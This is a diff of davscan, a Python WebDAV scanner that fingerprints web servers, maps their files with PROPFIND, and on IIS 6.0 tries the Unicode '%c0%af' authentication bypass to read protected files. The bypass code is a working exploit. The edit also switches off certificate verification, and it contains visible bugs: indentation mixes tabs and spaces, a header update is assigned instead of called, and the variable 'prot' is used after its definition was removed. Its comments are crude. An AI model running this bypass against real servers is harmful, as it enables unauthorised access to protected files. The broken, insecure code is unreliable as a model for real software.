@@ -36,13 +36,13 @@
 ## suitable for any purpose, porpise, or tortise, unless it's also a florist.  To be honest, you probably should not even use this in any
 ## environment you want to have working right.
 ##
-## Basically don't sue me if you decide to use this code that I'm putting out there for free and it breaks shit  I'm just as broke as this 
+## Basically you can't sue me if you decide to use this code that I'm putting out there for free and it breaks shit  I'm just as broke as this
 ## code and you'll just be pissing into the wind on that endeavor.  I already warned you that my code is bad.  Read through it and make sure
 ## you know what it does, or have your cousin that took a web design class in high school help you figure out what it does.  
 ##
 ## ...Or just take my word for it and wing it. #YOLO
 ##
-###############################################################################################################################################
+#############################################################################################################################################
 
 import base64
 import sqlite3
@@ -50,6 +50,7 @@ import requests
 import argparse
 import sys
 import os.path
+from urlparse import urlparse
 
 # below imports are a part of davscan
 import fingerprinter
@@ -86,10 +87,11 @@ class bcolors:
 #
 #############################################################################################
 def main():
-	args = get_args()
-	#assign variables
-	host = args.host
-	port = args.port
+	sess = requests.Session() #see that? It's a capital S.  Punctuation bitches!
+        args = get_args()
+	
+        #assign variables
+	url = args.url
 	auth = args.auth
 	user = args.user
 	pswd = args.password
@@ -97,19 +99,18 @@ def main():
 	dos = args.dos
 	msf = args.msf
 	unichar = "%c0%af"
-	
+
+	# disable cert verification automatically because that just breaks shit.
+        sess.verify = False
 	#pretty pandas up in huuurrrr
 	banner()
-	#build url for fingerprinting
-	#Probably want to make this logic a little less black and white
-	if port == 443:
-		prot = 'https'
-	else:
-		prot = 'http'
-	if not port:
-		port = 80
-	url = '{0}://{1}:{2}/'.format(prot, host, port)	
-	#if outfile exists we append otherwise write
+
+	#cut the url up like a hooker that stole some blow. You know what I'm talking about, Mikey. 
+        purl = urlparse(url)
+        host = purl.netloc
+        sess.headers = {'Host': purl.netloc}
+
+        #if outfile exists we append otherwise write
 	if os.path.exists(outfile):
 		o = open(outfile, "a")
 	else:
@@ -118,31 +119,27 @@ def main():
 	if auth is not None:
 		authstring = "%s:%s" % (user, pswd)
 		encodedstring = base64.b64encode(authstring)
-		headers = {'Authorization': 'Basic %s' % encodedstring}
+		sess.headers.update({'Authorization': 'Basic %s' % encodedstring})
 	else:
 		#just clearing out unused args
 		user = None
 		pswd = None
-	#I think we can remove the formatter function
-	#url = formatter(url)
-	#Fingerprint the server  The returned dictionary will have the following main keys 
-	#setup dav client instance
-	client = dav.Client()
-	f = fingerprinter.fingerprint(url,msf,dos) 
-	server = f.pop('Server')
-	davEnabled = f.pop('WebDAV')
+	
+	f = fingerprinter.fingerprint(sess,purl,msf,dos) 
+	server = f.get('Server', "No Server Header")
+	davEnabled = f.get('WebDAV', 'Unknown')
 	#clean up crap keys
 	f.pop('Exploit Title')
 	f.pop('')
 	directory = ""
-	#tabs = ""
-	if server == "IIS 6.0" and davEnabled == "Enabled":
+	if server == "IIS/6.0" and davEnabled == "Enabled":
 		dabp = True
 	else:
 		dabp = False
 	#Start building our file (eventually a database)
 	## con = sqlite3.connect(outfile + '.db')
 	## db_setup(conn)
+        
 	with o as i:
 		## conn = sqlite3.connect(outfile + '.db')
 	##if db_setup(conn):
@@ -154,15 +151,15 @@ def main():
 		for k,v in f.iteritems():
 			i.write(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " %s ==> %s \n" % (k, v)  )
 		i.write(bcolors.HEADER + "[*]===================={~Server Mapping~}====================[*] \n" + bcolors.ENDC)
-		if dabp == True:
-			headers = {'Host': host, 'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'}
-			r = client.propfind(url,headers)
+		if davEnabled == "Enabled":
+			sess.headers.update = {'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'}
+                        client = dav.Client(sess)
+			r = client.propfind(url)
 			for file in r:
 				if file[1] == 0 and file[2].split(' ')[2] == "OK":
 					fname = file[0].split('/')[-2]
 					directory = directory + "/" + fname
 					fname = directory
-					#tabs = tabs + "\t"
 				else:
 					fname = file[0].split('/')[-1]
 				status = file[2].split(' ')[2]
@@ -172,22 +169,24 @@ def main():
 				else:
 				
 					i.write(bcolors.WARNING + "[-] " + fname + "  " + bcolors.FAIL + status + bcolors.WARNING + "  " + size + "\n" + bcolors.ENDC)
-					headers = {'Host': host, 'Translate': 'f', 'Connection': 'close', 'User-Agent': 'RAAAWWWWWWWRRRRRR Dav Auth Bypass!!!'}
-					f = file[0].split('/')[3:]
-					d = len(f) -1
-					if d != 0:
-						url = prot + "://" + host + "/" + f[0][:2] + "%c0%af" + f[0][2:]
-						n = 1
-						while n != d:
-							url = url + "/" + f[n]
-							n = n + 1
-						url = url + "/" + fname
-					print("[!!] " + url)
-					response = client.get(url,headers)
-					if response.status_code == 200:
-						i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked!! \n" + bcolors.ENDC)
-					else:
-						i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
+                                        if dabp == True:
+					    f = file[0].split('/')[3:]
+					    d = len(f) -1
+					    if d != 0:
+						    url = prot + "://" + host + "/" + f[0][:2] + "%c0%af" + f[0][2:]
+						    n = 1
+						    while n != d:
+							    url = url + "/" + f[n]
+							    n = n + 1
+						    url = url + "/" + fname
+					    print("[!!] " + url)
+					    response = client.get(url)
+					    if response.status_code == 200:
+					        i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked!! \n" + bcolors.ENDC)
+					    else:
+					        i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
+                                        else:
+                                            i.write(bcolors.WARNING + "[-] Webserver doesn't appear to be IIS 6.0. Skipping auth bypass attempt. \n" + bcolors.ENDC)
 					
 					#	headers = {'Host': host, 'TE': 'trailers', 'Depth': '1', 'Content-Type': 'application/xml', 'User-Agent': 'ZOMG!!!!!!!!!!@#2!@#!@#!!'}
 					#	url = directory
@@ -209,7 +208,7 @@ def main():
 def banner():
 	print(bcolors.HEADER + "\n \
 	[*]===========================================================[*]\n \
-	[*]	 		  Davscan v0.1			      [*]\n \
+	[*]	 		  Davscan v0.5 (cobra whiskey)	      [*]\n \
 	[*]	 	       Written by Graph-X	   	      [*]\n \
 	[*]	 	  e-mail: graphx@sigaint.org 		      [*]\n \
 	[*]  	   	       twitter: @graphx  		      [*]\n \
@@ -225,8 +224,7 @@ def banner():
 ################################################################
 def get_args():
 	parser = argparse.ArgumentParser()
-	parser.add_argument('-H', '--host', dest='host', help="hostname or IP address of web server; -h foo.com", required=True)
-	parser.add_argument('-p', '--port', dest='port', default='80', help="port to connect to the host on (defaults to port 80); -p 80", required=False)
+        parser.add_argument('url', type=str, action='store', help="url of the server to scan; https://foo.com:8443/")
 	parser.add_argument('-a', '--auth', dest='auth', default=None, help="Basic authentication required; -a basic", required=False)
 	parser.add_argument('-u', '--user', dest='user', default=None, help="user; -u derpina", required=False)
 	parser.add_argument('-P', '--password', dest='password', default=None, help="password; -P 'P@$$W0rd'", required=False)
@@ -234,6 +232,11 @@ def get_args():
 	parser.add_argument('-d', '--no-dos', dest='dos', action='store_true', help="exclude DoS modules", required=False)
 	parser.add_argument('-m', '--no-msf', dest='msf', action='store_true', help="exclude MSF modules from results", required=False)
 	args = parser.parse_args()
+        #yeah I know this sloppy but what do you want for nothing?  A rubber biscuit?! ..bow bow bow
+        if len(args.url) < 10:
+            print(bcolors.WARNING + "[!] Invalid or missing URL" + bcolors.ENDC)
+            parser.print_help()
+            sys.exit(2)
 	if len(sys.argv) == 1:
 		parser.print_help()
 		sys.exit(2)
